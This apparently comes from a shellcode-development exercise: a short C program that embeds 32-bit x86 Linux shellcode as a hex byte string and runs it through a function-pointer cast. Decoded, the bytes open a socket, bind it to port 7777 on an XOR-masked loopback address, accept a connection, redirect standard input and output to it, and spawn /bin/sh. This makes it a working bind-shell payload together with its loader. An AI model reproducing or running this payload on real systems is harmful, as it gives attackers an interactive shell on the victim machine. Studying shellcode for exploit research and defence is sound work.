#include <stdio.h>
#include <string.h>
unsigned char code[] = \
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xdb\xb8\x8f\x01\x01\x10\x35\xf0\x01\x01\x11\x50\x66\x68\x1e\x61\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\x31\xc0\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf6\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;
int main(){
	printf("shellcode Length: %d\n" , strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
